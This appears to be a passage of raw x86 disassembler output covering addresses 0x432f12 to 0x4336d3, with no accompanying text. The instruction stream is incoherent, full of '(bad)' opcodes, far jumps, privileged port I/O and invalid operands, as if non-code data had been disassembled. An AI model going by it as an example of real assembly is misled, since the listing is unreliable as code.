  432f12:	sahf   
  432f13:	cdq    
  432f14:	adc    DWORD PTR [ebp-0x7a],eax
  432f17:	jae    0x432f02
  432f19:	test   BYTE PTR [eax+0x6dfb3e35],cl
  432f1f:	sbb    BYTE PTR [ebp-0xf],bl
  432f22:	(bad)  
  432f23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432f24:	lods   eax,DWORD PTR ds:[esi]
  432f25:	xchg   esi,eax
  432f26:	jl     0x432fa4
  432f28:	mov    dl,al
  432f2a:	xor    dh,ah
  432f2c:	mov    esi,0xbe2bc871
  432f31:	add    esp,DWORD PTR [eax+0x1b0d22a1]
  432f37:	xchg   esp,eax
  432f38:	xchg   edi,eax
  432f39:	jmp    0xf060e2ec
  432f3e:	jmp    0xeddb:0x8fe19ac5
  432f45:	fldcw  WORD PTR ds:0xad881977
  432f4b:	push   edi
  432f4c:	fimul  WORD PTR [ecx]
  432f4e:	jp     0x432f3d
  432f50:	(bad)  [ebp+0x7e]
  432f53:	cmp    BYTE PTR [eax-0x5b],0xf7
  432f57:	iret   
  432f58:	gs call 0x7c26926f
  432f5e:	dec    ecx
  432f5f:	loope  0x432fab
  432f61:	xor    bh,BYTE PTR [ebx+0x54]
  432f64:	xchg   esi,eax
  432f65:	test   al,0x86
  432f67:	sub    dl,dl
  432f69:	(bad)  
  432f6a:	fwait
  432f6b:	leave  
  432f6c:	xchg   ebx,eax
  432f6d:	push   ds
  432f6e:	or     eax,ecx
  432f70:	inc    ebx
  432f71:	jg     0x432fc5
  432f73:	outs   dx,DWORD PTR ds:[esi]
  432f74:	or     eax,0xc29d9d9f
  432f79:	pop    eax
  432f7a:	jno    0x432f81
  432f7c:	stc    
  432f7d:	fs in  eax,0x1e
  432f80:	adc    eax,0x88c364f
  432f85:	jmp    0x432faa
  432f87:	out    0x50,al
  432f89:	xchg   DWORD PTR [ecx-0x3e],esp
  432f8c:	sahf   
  432f8d:	ss mov bl,0xb
  432f90:	xchg   ecx,eax
  432f92:	loope  0x432f44
  432f94:	shl    BYTE PTR [ecx-0x56],cl
  432f97:	sbb    DWORD PTR [esi+0x33fe962b],ecx
  432f9d:	loopne 0x432f44
  432f9f:	cmp    edi,DWORD PTR [esi+0x51]
  432fa2:	xor    eax,0x6cc2465f
  432fa7:	xchg   ebp,eax
  432fa8:	xchg   edx,eax
  432fa9:	fcomp  DWORD PTR [eax+0x46]
  432fad:	jecxz  0x432f72
  432faf:	ficom  DWORD PTR [esi+esi*2+0x20]
  432fb3:	cwde   
  432fb4:	mov    dl,0x64
  432fb6:	out    0xbc,al
  432fb8:	sbb    ah,BYTE PTR ds:0xdb965f75
  432fbe:	push   cs
  432fbf:	mov    dl,0x96
  432fc1:	dec    ebx
  432fc2:	xchg   edx,eax
  432fc3:	dec    esp
  432fc4:	xchg   edi,eax
  432fc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432fc6:	fiadd  DWORD PTR ds:0xca7c3e4b
  432fcc:	mov    cl,0x78
  432fce:	loop   0x432faa
  432fd0:	xchg   edi,eax
  432fd1:	sbb    DWORD PTR [edx+0x6b],ecx
  432fd4:	adc    al,0xb2
  432fd6:	xchg   esi,eax
  432fd7:	and    al,0xce
  432fd9:	inc    ecx
  432fda:	and    al,0xe4
  432fdc:	fstp   TBYTE PTR [eax-0x41db6442]
  432fe2:	ficomp WORD PTR [ecx+ebx*2-0x66]
  432fe6:	sbb    eax,0xa8616786
  432feb:	sbb    al,0x4
  432fed:	add    ch,BYTE PTR [esi+0x5c]
  432ff0:	cmp    DWORD PTR [esi+0x66],ebp
  432ff3:	stos   BYTE PTR es:[edi],al
  432ff4:	push   ebx
  432ff5:	dec    edx
  432ff6:	sbb    BYTE PTR [esi+edi*2+0x52],cl
  432ffa:	mov    dl,0xe1
  432ffc:	sahf   
  432ffd:	shr    edi,cl
  432fff:	ds mov esp,0xa527ab02
  433005:	push   0xffffffea
  433007:	stos   DWORD PTR es:[edi],eax
  433008:	imul   ecx,edi,0xffffffa1
  43300b:	or     ch,BYTE PTR [edx-0x711cacd3]
  433011:	retf   
  433012:	lods   eax,DWORD PTR ds:[esi]
  433013:	shr    BYTE PTR [eax-0x3c],cl
  433016:	push   ds
  433017:	lahf   
  433018:	jge    0x433007
  43301a:	ja     0x432fe3
  43301c:	xor    DWORD PTR [esi+0x73],0x42648ebe
  433023:	arpl   bx,si
  433025:	dec    ebx
  433026:	mov    esp,0x770a75e2
  43302b:	stc    
  43302c:	scas   eax,DWORD PTR es:[edi]
  43302d:	daa    
  43302e:	pushf  
  43302f:	aam    0x8e
  433031:	stos   BYTE PTR es:[edi],al
  433032:	xchg   edx,eax
  433033:	jb     0x432ff4
  433035:	jb     0x432fc6
  433037:	call   0xd8605750
  43303c:	repnz pop esp
  43303e:	jmp    0xa2ed:0xde823db3
  433045:	out    0xfe,al
  433047:	sti    
  433048:	mov    esi,DWORD PTR [eax-0x471038f6]
  43304e:	jmp    0x433051
  433050:	mov    bl,BYTE PTR [esi+0x71827352]
  433056:	xchg   ecx,eax
  433057:	pop    edx
  433058:	aad    0xc8
  43305a:	jo     0x433005
  43305c:	jae    0x4330b9
  43305e:	mov    ds:0xe16b0f59,eax
  433063:	popf   
  433064:	addr16 fxch st(1)
  433067:	div    BYTE PTR [ecx+eiz*4]
  43306a:	mov    dl,bh
  43306c:	ds retf 0xef65
  433070:	inc    esp
  433071:	mov    al,ds:0xfdea530e
  433076:	mov    gs,WORD PTR [eax-0x18]
  433079:	pop    ebx
  43307a:	sbb    edx,DWORD PTR [ebx+0x30]
  43307d:	or     dl,BYTE PTR [ebx-0x492175d1]
  433083:	xor    dh,BYTE PTR [ebp+0x5]
  433086:	sbb    ecx,DWORD PTR [ecx-0x3bfd351e]
  43308c:	rol    BYTE PTR [edx+0x1c2d9ce8],cl
  433092:	in     eax,0x61
  433094:	ret    0xa2fc
  433097:	sbb    DWORD PTR [ebx-0x1e95a6bf],ebp
  43309d:	dec    DWORD PTR [ecx]
  43309f:	mov    bl,0x55
  4330a1:	xor    eax,0x93cc6944
  4330a6:	loop   0x4330d6
  4330a8:	jb     0x43302b
  4330aa:	test   DWORD PTR [edi-0x79],0x82ec6b45
  4330b1:	sub    bh,ch
  4330b3:	pop    esp
  4330b4:	gs push ds
  4330b6:	inc    eax
  4330b7:	nop
  4330b8:	and    edx,DWORD PTR [eax]
  4330ba:	icebp  
  4330bb:	bound  esp,QWORD PTR [ecx+eax*1+0x2a573a4d]
  4330c2:	and    dh,BYTE PTR [edi]
  4330c4:	outs   dx,DWORD PTR ds:[esi]
  4330c5:	popf   
  4330c6:	into   
  4330c7:	add    BYTE PTR [ebx+0x39d9a1c],cl
  4330cd:	mov    al,ds:0x81a586e1
  4330d2:	cmp    eax,0x13df557a
  4330d7:	xlat   BYTE PTR ds:[ebx]
  4330d8:	inc    edi
  4330d9:	(bad)  
  4330da:	mov    cl,0x64
  4330dc:	enter  0xd5dd,0x8f
  4330e0:	mov    ecx,0xe97551
  4330e5:	pop    DWORD PTR [edx-0x7b]
  4330e8:	inc    eax
  4330e9:	push   esp
  4330ea:	lahf   
  4330eb:	jmp    0x714f6bd1
  4330f0:	sub    BYTE PTR [eax-0x77],0x7e
  4330f4:	popa   
  4330f5:	(bad)  
  4330f6:	ficomp WORD PTR [ebp+0x7c]
  4330f9:	popa   
  4330fa:	fist   DWORD PTR [ebx+0x5094927c]
  433100:	lods   eax,DWORD PTR ds:[esi]
  433101:	ins    DWORD PTR es:[edi],dx
  433102:	shr    BYTE PTR [ecx-0x7f],1
  433105:	push   es
  433106:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433107:	xchg   edx,eax
  433108:	mov    esp,0x1cc60813
  43310d:	sub    al,0x9e
  43310f:	pop    es
  433110:	add    BYTE PTR [ecx-0x35],0x70
  433114:	dec    esi
  433115:	mov    cl,0x1b
  433117:	es out 0x8d,al
  43311a:	aad    0xff
  43311c:	dec    edx
  43311d:	inc    esp
  43311e:	mov    edx,0x6a25ca19
  433123:	mov    ebx,0x2049379b
  433128:	jne    0x433129
  43312a:	or     BYTE PTR [edx],0x58
  43312d:	dec    ebp
  43312e:	sub    al,0xf4
  433130:	adc    edx,DWORD PTR [eax-0x46]
  433133:	lods   eax,DWORD PTR ds:[esi]
  433134:	push   cs
  433135:	inc    esi
  433136:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433137:	sub    esi,ebp
  433139:	das    
  43313a:	in     al,dx
  43313b:	and    eax,0x3f90d3d5
  433140:	mov    al,ds:0x861a2542
  433145:	loope  0x43316e
  433147:	(bad)  
  433148:	push   edi
  433149:	fidivr WORD PTR [edi+0x4ca726d3]
  43314f:	jmp    0x4330e3
  433151:	repnz pop edi
  433153:	fucomip st,st(1)
  433155:	lods   eax,DWORD PTR ds:[esi]
  433156:	test   BYTE PTR [edx-0x6b],dh
  433159:	fbld   TBYTE PTR [edi]
  43315b:	js     0x433151
  43315d:	(bad)  
  43315e:	das    
  43315f:	jnp    0x433144
  433161:	int    0xf6
  433163:	and    al,0x60
  433165:	leave  
  433166:	es mov eax,0x8df09d00
  43316c:	out    dx,eax
  43316d:	pop    edi
  43316e:	enter  0x51a7,0x71
  433172:	dec    eax
  433173:	and    dl,BYTE PTR [ebx+0x51dab45a]
  433179:	adc    eax,ebx
  43317b:	sahf   
  43317c:	pop    es
  43317d:	call   0x36f1:0x37183f23
  433184:	mov    eax,0x746bd83
  433189:	add    esi,DWORD PTR [esi-0x1e]
  43318c:	or     BYTE PTR [eax-0x167c7188],cl
  433192:	dec    ecx
  433193:	aad    0x87
  433195:	in     eax,0x98
  433197:	cli    
  433198:	ds jnp 0x43318e
  43319b:	sub    BYTE PTR [esi+esi*1+0xd],dh
  43319f:	jns    0x4331da
  4331a1:	mov    edi,0xe54c4fdf
  4331a6:	stos   BYTE PTR es:[edi],al
  4331a7:	lods   eax,DWORD PTR ds:[esi]
  4331a8:	cmp    BYTE PTR [esi],dh
  4331aa:	call   0x2ebc5a28
  4331af:	xchg   ebx,eax
  4331b0:	push   ecx
  4331b1:	inc    eax
  4331b2:	ins    DWORD PTR es:[edi],dx
  4331b3:	jge    0x433204
  4331b5:	pop    ecx
  4331b6:	out    dx,eax
  4331b7:	push   0xffffffc7
  4331b9:	ins    BYTE PTR es:[edi],dx
  4331ba:	dec    edx
  4331bb:	mov    ds:0xb4fc2d28,eax
  4331c0:	das    
  4331c1:	mov    ?,ebx
  4331c3:	mov    dl,0xd
  4331c5:	cwd    
  4331c7:	jb     0x4331ba
  4331c9:	test   eax,0xfbc054db
  4331ce:	push   esi
  4331cf:	sbb    eax,0x481dac97
  4331d4:	div    DWORD PTR [esi+ebx*4]
  4331d7:	rcr    BYTE PTR [esi-0x6f],0xb
  4331db:	icebp  
  4331dc:	in     eax,dx
  4331dd:	nop
  4331de:	enter  0x77c0,0x44
  4331e2:	pop    es
  4331e3:	cld    
  4331e4:	dec    edi
  4331e5:	xchg   DWORD PTR [ecx],esi
  4331e7:	test   al,0x51
  4331e9:	into   
  4331ea:	pop    ebx
  4331eb:	push   ds
  4331ec:	adc    DWORD PTR [esi+0x56],ebx
  4331ef:	and    eax,0x495500ea
  4331f4:	dec    ecx
  4331f5:	cli    
  4331f6:	cmp    BYTE PTR ds:0xf9de81c,bh
  4331fc:	in     al,0xed
  4331fe:	pop    esp
  4331ff:	and    cl,BYTE PTR ds:0x9ecb87e8
  433205:	cmp    eax,0x83b6f617
  43320a:	and    al,0x83
  43320c:	and    eax,0x8ac9fe66
  433211:	xchg   edi,eax
  433212:	aaa    
  433213:	mov    esi,0xca496d50
  433218:	pop    ebx
  433219:	mul    ch
  43321b:	sub    DWORD PTR [edi],0x24
  43321e:	mov    esp,0x2012ae8f
  433223:	dec    edx
  433224:	or     DWORD PTR es:[ecx],eax
  433227:	xchg   esp,eax
  433228:	je     0x4331b6
  43322a:	cmp    eax,0x2bb1c34f
  43322f:	adc    DWORD PTR [ecx],ecx
  433231:	and    ah,BYTE PTR ds:0xa0dc5484
  433237:	or     al,0x93
  433239:	push   es
  43323a:	dec    edx
  43323b:	fs push edi
  43323d:	js     0x433230
  43323f:	(bad)  
  433240:	mov    ch,0x7a
  433242:	mov    eax,ds:0xe199a00
  433247:	popf   
  433248:	push   esp
  433249:	dec    esp
  43324a:	rol    BYTE PTR ds:0x6e5981b2,1
  433250:	sbb    eax,0x1f78672c
  433255:	in     eax,0x71
  433257:	xchg   DWORD PTR [esi+0x6],ebx
  43325a:	dec    edx
  43325b:	in     eax,dx
  43325c:	cmp    DWORD PTR [edi+ecx*1],ebx
  43325f:	pop    ss
  433260:	retf   0x7f8a
  433263:	and    BYTE PTR [esi-0x9ea877],bh
  433269:	jb     0x433298
  43326b:	xchg   edx,eax
  43326c:	pop    eax
  43326d:	jmp    0x97233d9e
  433272:	push   ecx
  433273:	mov    WORD PTR [ebp+edi*8+0x27b280c6],es
  43327a:	pop    ebx
  43327b:	(bad)  
  43327c:	in     eax,0x23
  43327e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43327f:	aaa    
  433280:	loope  0x4332a5
  433282:	nop
  433283:	aam    0x23
  433285:	pop    es
  433286:	in     eax,0x65
  433288:	retf   0x3177
  43328b:	xchg   ecx,eax
  43328c:	mov    eax,0xff3831e5
  433291:	scas   al,BYTE PTR es:[edi]
  433292:	xchg   bh,al
  433294:	stos   BYTE PTR es:[edi],al
  433295:	pop    eax
  433296:	mov    ebp,0x7b8abf6b
  43329b:	(bad)  
  43329c:	aas    
  43329d:	enter  0xd1bd,0x77
  4332a1:	add    ch,bh
  4332a3:	xchg   edx,eax
  4332a4:	into   
  4332a5:	add    ebx,esi
  4332a7:	mov    ds:0xd589f176,al
  4332ac:	sub    dl,BYTE PTR [esi+0x7f]
  4332af:	or     eax,0x5983d531
  4332b4:	je     0x433293
  4332b6:	out    dx,eax
  4332b7:	in     al,0x68
  4332b9:	mov    fs,WORD PTR [eax+0x11]
  4332bc:	mov    al,BYTE PTR [ebp-0x363eb344]
  4332c2:	mov    esp,0x2696ee56
  4332c7:	xlat   BYTE PTR ds:[ebx]
  4332c8:	mov    eax,ss:0x6f51c317
  4332ce:	push   0x56
  4332d0:	ret    
  4332d1:	fndisi(8087 only) 
  4332d3:	rcl    al,0x70
  4332d6:	xchg   edi,eax
  4332d7:	mov    ah,0x82
  4332d9:	repnz and ebp,ebx
  4332dc:	call   0xf354:0x8d620f9f
  4332e3:	xchg   ecx,eax
  4332e4:	dec    esp
  4332e5:	iret   
  4332e6:	xor    esp,esi
  4332e8:	mov    edi,0x9a9a51f5
  4332ed:	xchg   BYTE PTR [edi-0x4f531b9],bl
  4332f3:	add    DWORD PTR [ecx+0x408c0e2c],ebp
  4332f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4332fa:	in     al,0x54
  4332fc:	cli    
  4332fd:	or     esp,esp
  4332ff:	ins    BYTE PTR es:[edi],dx
  433300:	gs mov ch,0x60
  433303:	push   es
  433304:	lock mov al,BYTE PTR [esi-0x5f9fb78]
  43330b:	inc    ebx
  43330c:	push   0x3
  43330e:	aam    0xa9
  433310:	scas   eax,DWORD PTR es:[edi]
  433311:	and    dh,BYTE PTR [ebx]
  433313:	jle    0x433384
  433315:	and    dl,BYTE PTR [ebx]
  433317:	cmc    
  433318:	leave  
  433319:	mov    cl,0x2e
  43331b:	jne    0x433324
  43331d:	add    ah,dh
  43331f:	leave  
  433320:	in     eax,dx
  433321:	bound  eax,QWORD PTR [edi+0x54]
  433324:	std    
  433325:	cdq    
  433326:	inc    esi
  433327:	xlat   BYTE PTR ds:[ebx]
  433328:	pop    esp
  433329:	or     esi,DWORD PTR [esi-0x61d2d7f2]
  43332f:	xor    DWORD PTR [esp+ebx*2],0xffffffc9
  433333:	imul   eax,DWORD PTR ss:[edx+edx*1-0x56cae765],0xfffffff5
  43333c:	inc    ebp
  43333d:	cwde   
  43333e:	pop    eax
  43333f:	mov    al,ds:0x31bf1db7
  433344:	inc    ecx
  433345:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433346:	test   BYTE PTR [ebx+0x1749aa1c],ah
  43334c:	push   edx
  43334d:	mov    cs,WORD PTR [edi]
  43334f:	mov    eax,ds:0x42eb773
  433354:	dec    ebp
  433355:	jmp    0x4332ec
  433357:	std    
  433358:	add    bl,BYTE PTR [ebx]
  43335a:	mov    dh,0xe2
  43335c:	lock cdq 
  43335e:	push   0x73
  433360:	iret   
  433361:	outs   dx,DWORD PTR ds:[esi]
  433362:	xchg   edx,eax
  433363:	or     ah,BYTE PTR [ebp-0x25e7ec5d]
  433369:	sti    
  43336a:	or     edx,eax
  43336c:	mov    cl,0x44
  43336e:	call   0x54c1:0xec3b3e3f
  433375:	fisttp DWORD PTR [esp+ebx*2]
  433378:	mov    ds:0xa3ce5118,al
  43337e:	inc    ecx
  43337f:	xchg   ebp,eax
  433380:	mov    ecx,0x63f65083
  433385:	pop    ebp
  433386:	sbb    DWORD PTR [edi+0x100e5820],eax
  43338c:	mov    es:0x1c6962e0,eax
  433392:	inc    edx
  433393:	xlat   BYTE PTR ds:[ebx]
  433394:	int    0x7e
  433396:	je     0x43338e
  433398:	xchg   BYTE PTR [esi*4-0x71102795],bl
  43339f:	pop    edi
  4333a0:	in     eax,0x98
  4333a2:	mov    ah,0x6a
  4333a4:	arpl   WORD PTR [edi+0x47],di
  4333a7:	jg     0x4333ee
  4333a9:	xor    BYTE PTR [edi+0x64],al
  4333ac:	or     eax,DWORD PTR [ebx]
  4333ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4333af:	dec    esp
  4333b0:	cmp    eax,0x7170f6d1
  4333b5:	ja     0x43334f
  4333b7:	mov    DWORD PTR [ecx+0xe],edi
  4333ba:	add    esi,ebp
  4333bc:	pop    es
  4333bd:	cmp    DWORD PTR [edi],0xffffffad
  4333c0:	or     BYTE PTR [ecx],al
  4333c2:	add    DWORD PTR [ecx],0xe8e48f1d
  4333c8:	lods   eax,DWORD PTR ds:[esi]
  4333c9:	je     0x43342e
  4333cb:	push   0x41a506c8
  4333d0:	jb     0x43335b
  4333d2:	call   0x73e32f5c
  4333d7:	bound  ebx,QWORD PTR [ebx]
  4333d9:	into   
  4333da:	(bad)  
  4333db:	test   DWORD PTR [esi],0x60fd2d47
  4333e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4333e2:	push   ebp
  4333e3:	mov    ds:0x41f5fa67,eax
  4333e8:	iret   
  4333e9:	mov    dl,0x80
  4333eb:	and    al,BYTE PTR [edx-0x42]
  4333ee:	mov    esi,DWORD PTR [esi]
  4333f0:	in     eax,0x6a
  4333f2:	repnz push cs
  4333f4:	cmp    al,0xd0
  4333f6:	enter  0x987a,0x4c
  4333fa:	aad    0x9a
  4333fc:	jp     0x4333e0
  4333fe:	adc    eax,0xcbd15d58
  433403:	loopne 0x4333b4
  433405:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433406:	pop    eax
  433407:	cmp    al,0xa8
  433409:	in     al,0xba
  43340b:	sbb    bl,al
  43340d:	jb     0x433404
  43340f:	push   0xffffff9d
  433411:	cmp    BYTE PTR [edx],bl
  433413:	add    BYTE PTR ds:0xa7b050,dh
  433419:	inc    eax
  43341a:	outs   dx,BYTE PTR ds:[esi]
  43341b:	div    ecx
  43341d:	sbb    eax,0x57a1485c
  433422:	shl    BYTE PTR [edx-0xacf6fc4],0x2d
  433429:	clc    
  43342a:	(bad)  
  43342b:	bswap  eax
  43342d:	mov    cl,0x64
  43342f:	popa   
  433430:	cmp    ebx,DWORD PTR [edi+0x3006f160]
  433436:	enter  0xab58,0x25
  43343a:	and    eax,0x20bce826
  43343f:	mov    ebx,0x324255b4
  433444:	aad    0x0
  433446:	mov    WORD PTR [esi+0x31451e07],fs
  43344c:	push   ebp
  43344d:	or     esi,DWORD PTR [esi]
  43344f:	adc    al,0x32
  433451:	aaa    
  433452:	pop    DWORD PTR [ebx-0x6fc81f2b]
  433458:	mov    al,0x55
  43345a:	mov    ?,WORD PTR [ebx]
  43345c:	sbb    DWORD PTR [ebp+esi*8-0x5e],edx
  433460:	mov    ch,0x36
  433462:	leave  
  433463:	pop    esi
  433464:	jmp    0x3e54:0xd12ae041
  43346b:	loop   0x433405
  43346d:	rcr    al,cl
  43346f:	mov    edx,0x3fc50bf3
  433474:	inc    edx
  433475:	enter  0x3859,0x93
  433479:	adc    DWORD PTR [edi],ebp
  43347b:	or     eax,0x402da907
  433480:	fdivrp st(1),st
  433482:	(bad)  [edx+0x46a4e4a9]
  433488:	mov    ch,0x1e
  43348b:	daa    
  43348c:	jae    0x433434
  43348e:	adc    BYTE PTR [edi],bl
  433490:	mov    dl,BYTE PTR [eax]
  433492:	inc    ecx
  433493:	adc    BYTE PTR [edi],dh
  433495:	adc    al,0x9d
  433497:	ins    BYTE PTR es:[edi],dx
  433498:	mov    ecx,0xe5a6ef56
  43349d:	pusha  
  43349e:	add    bl,BYTE PTR [esi-0xb]
  4334a1:	inc    edx
  4334a2:	out    0x34,eax
  4334a4:	dec    ecx
  4334a5:	mov    eax,DWORD PTR [eax+0x25]
  4334a8:	push   ss
  4334a9:	pop    ss
  4334aa:	cld    
  4334ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4334ac:	mov    bl,0x14
  4334ae:	test   DWORD PTR [eax-0x7c7f59c4],edi
  4334b4:	fistp  QWORD PTR [ecx-0x15fa475f]
  4334ba:	push   es
  4334bb:	jge    0x4334a4
  4334bd:	push   edx
  4334be:	out    dx,eax
  4334bf:	add    dh,cl
  4334c1:	inc    ecx
  4334c2:	mov    BYTE PTR [esp+ebp*1],cl
  4334c5:	out    0xb4,eax
  4334c7:	imul   eax,DWORD PTR [eax],0x9d5a495a
  4334cd:	jmp    0xded2:0xd6e50554
  4334d4:	aam    0xa9
  4334d6:	jnp    0x433519
  4334d8:	push   ebx
  4334d9:	fwait
  4334da:	outs   dx,BYTE PTR ds:[esi]
  4334db:	cmp    al,al
  4334dd:	ds mov ch,dh
  4334e0:	pop    edx
  4334e1:	fwait
  4334e2:	xchg   WORD PTR [ebp+0x3],bp
  4334e6:	pop    es
  4334e7:	sub    al,0xf4
  4334e9:	sbb    ebp,DWORD PTR [ecx-0x40]
  4334ec:	push   ss
  4334ed:	jo     0x4334d5
  4334ef:	adc    DWORD PTR [ebx-0x6da459e],edi
  4334f5:	int3   
  4334f6:	cmp    esi,DWORD PTR [edi+0x3d36e083]
  4334fc:	push   ds
  4334fd:	ret    0x20c0
  433500:	es mul ch
  433503:	stos   BYTE PTR es:[edi],al
  433504:	push   es
  433505:	stc    
  433506:	pop    esi
  433507:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433508:	mov    edx,0xb0e999fa
  43350d:	lock popf 
  43350f:	lahf   
  433510:	push   edx
  433511:	clc    
  433512:	repz jae 0x43356d
  433515:	add    dl,BYTE PTR [ebx+0x3c0ae926]
  43351b:	or     BYTE PTR [edx+0x63],0x7c
  43351f:	sub    ah,BYTE PTR [eax+0x50]
  433522:	dec    ecx
  433523:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433524:	adc    eax,0x481a893c
  433529:	aaa    
  43352a:	imul   eax,DWORD PTR [ebx],0x4f
  43352d:	shl    ecx,1
  43352f:	cmc    
  433530:	add    BYTE PTR [eax],cl
  433532:	cmp    edi,DWORD PTR [ecx+0x5f]
  433535:	test   DWORD PTR [esi+0x3693154d],esi
  43353b:	fdiv   QWORD PTR fs:[edi-0x1b]
  43353f:	adc    al,0xee
  433541:	push   ebp
  433542:	xor    BYTE PTR [ecx+ebp*2+0x4488aaf4],bl
  433549:	cmp    al,0x5c
  43354b:	aaa    
  43354c:	(bad)  
  43354d:	and    al,BYTE PTR [ebx-0x37591d20]
  433553:	out    0x22,eax
  433555:	int3   
  433556:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433557:	aam    0xe
  433559:	scas   al,BYTE PTR es:[edi]
  43355a:	jo     0x4335c0
  43355c:	leave  
  43355d:	sub    eax,0xe827b8ba
  433562:	inc    ebx
  433563:	hlt    
  433564:	icebp  
  433565:	and    cl,BYTE PTR [edi-0x46343d24]
  43356b:	test   BYTE PTR [esi],ah
  43356d:	jmp    0x4335e2
  43356f:	jne    0x433535
  433571:	push   esi
  433572:	aad    0x20
  433574:	add    DWORD PTR ds:[edx-0x68],ebp
  433578:	xchg   ebx,eax
  433579:	dec    esp
  43357a:	cmp    BYTE PTR [eax],bh
  43357c:	in     eax,dx
  43357d:	rcr    dl,0x97
  433580:	push   esi
  433581:	xchg   DWORD PTR [ebx-0x16],esi
  433584:	retf   0xaf94
  433587:	retf   
  433588:	scas   al,BYTE PTR es:[di]
  43358a:	imul   esi,ebx,0x54d0308c
  433590:	push   esp
  433591:	jmp    0x1e9a:0xd0585ebc
  433598:	mov    ecx,0x690de0d3
  43359d:	icebp  
  43359e:	mov    bl,0x4
  4335a0:	pushf  
  4335a1:	sbb    DWORD PTR [ebp-0x35d95d95],ecx
  4335a7:	enter  0xc87f,0x98
  4335ab:	icebp  
  4335ac:	cmp    al,0x1a
  4335ae:	sbb    eax,0x37fdf0ab
  4335b3:	cdq    
  4335b4:	dec    esi
  4335b5:	pop    ss
  4335b6:	pop    es
  4335b7:	adc    eax,0x358c7e65
  4335bc:	inc    esi
  4335bd:	pusha  
  4335be:	pushf  
  4335bf:	xor    ch,dh
  4335c1:	imul   esp,DWORD PTR [ecx+0x4c],0x6a3aa277
  4335c8:	int3   
  4335c9:	cmp    dh,BYTE PTR [eax+0x47cb0509]
  4335cf:	(bad)  
  4335d0:	xchg   edi,eax
  4335d1:	xlat   BYTE PTR ds:[ebx]
  4335d2:	std    
  4335d3:	xchg   ecx,eax
  4335d4:	mov    eax,0xdcaa49ec
  4335d9:	cmp    esp,DWORD PTR [esi]
  4335db:	sar    BYTE PTR [edi+eiz*2-0x3369372a],cl
  4335e2:	out    dx,eax
  4335e3:	stos   BYTE PTR es:[edi],al
  4335e4:	repnz in eax,0x4b
  4335e7:	mul    BYTE PTR [edx-0x36]
  4335ea:	bswap  esi
  4335ec:	mov    dl,0x80
  4335ee:	pop    edx
  4335ef:	jp     0x43366b
  4335f1:	(bad)  ds:0x1ceb49f9
  4335f7:	jo     0x4335be
  4335f9:	sub    al,0x0
  4335fb:	mov    WORD PTR [ecx+0x1f],?
  4335fe:	test   dl,0x35
  433601:	pop    edi
  433602:	sbb    al,0x41
  433604:	cmp    esi,esi
  433606:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433607:	fnstenv [ebp-0x70]
  43360a:	add    al,0xf4
  43360c:	das    
  43360d:	cmc    
  43360e:	pop    es
  43360f:	mov    bh,0x12
  433611:	outs   dx,BYTE PTR ds:[esi]
  433612:	push   cs
  433613:	stos   BYTE PTR es:[edi],al
  433614:	es jb  0x4335a6
  433617:	idiv   BYTE PTR [ebp+0xe]
  43361a:	or     ah,BYTE PTR [eax]
  43361c:	ror    esp,cl
  43361e:	jge    0x433627
  433620:	rol    BYTE PTR [ebx+0x13],1
  433623:	loop   0x4335a7
  433625:	mov    al,0xa9
  433627:	pop    edx
  433628:	push   eax
  433629:	(bad)  
  43362a:	in     eax,0x4
  43362c:	adc    eax,0xd0472851
  433631:	stos   DWORD PTR es:[edi],eax
  433632:	(bad)  
  433633:	imul   eax
  433635:	inc    esi
  433636:	xchg   edx,eax
  433637:	fs inc edx
  433639:	mov    bl,al
  43363b:	les    ebx,FWORD PTR [eax-0x6a0b957e]
  433641:	ss cmp al,0xf4
  433644:	push   ebx
  433645:	sbb    DWORD PTR [eax+0x5e0e78e0],ecx
  43364b:	call   FWORD PTR [eax-0x7]
  43364e:	loopne 0x43360e
  433650:	es pop ds
  433652:	xchg   esi,eax
  433653:	loopne 0x43366f
  433655:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433656:	adc    BYTE PTR [ecx-0x5b],ch
  433659:	fstp   QWORD PTR [ebp+0x29]
  43365c:	jmp    0x88bc:0x1138ea3e
  433663:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433664:	dec    esp
  433665:	test   al,0xaf
  433667:	add    esi,DWORD PTR [edx]
  433669:	loope  0x433651
  43366b:	fdivr  st(2),st
  43366d:	stc    
  43366e:	or     ecx,DWORD PTR [ecx+0x6e]
  433671:	ficom  WORD PTR [ebp-0x60dfe899]
  433677:	push   edx
  433678:	call   0xfb9d:0xdf684772
  43367f:	xchg   ebp,ecx
  433681:	xor    eax,0x8fa6544b
  433686:	imul   ebp,DWORD PTR [ebp+0x67],0xf646075c
  43368d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43368e:	out    0xd8,eax
  433690:	dec    ecx
  433691:	adc    eax,0x170755d9
  433696:	jmp    0x43362a
  433698:	lods   al,BYTE PTR ds:[esi]
  433699:	mov    edi,0x27b7a220
  43369e:	push   ds
  43369f:	fld    DWORD PTR [ecx+ebx*1-0x257f8e13]
  4336a6:	retf   
  4336a7:	xor    edi,DWORD PTR [eax-0x36f427a9]
  4336ad:	std    
  4336ae:	std    
  4336af:	lds    edi,FWORD PTR [ecx+0x56d2adb]
  4336b5:	inc    ebx
  4336b6:	and    eax,0xe0af2bbd
  4336bb:	pop    eax
  4336bc:	add    ebx,ebp
  4336be:	fdiv   DWORD PTR [ebp-0x3868b63d]
  4336c4:	xor    eax,0x7a767b61
  4336c9:	cmp    al,0x7d
  4336cb:	scas   eax,DWORD PTR es:[edi]
  4336cc:	or     ecx,DWORD PTR [esi]
  4336ce:	add    eax,0x65ab0fd2
  4336d3:	bound  esi,QWORD PTR [ebx-0x7f8d97f8]
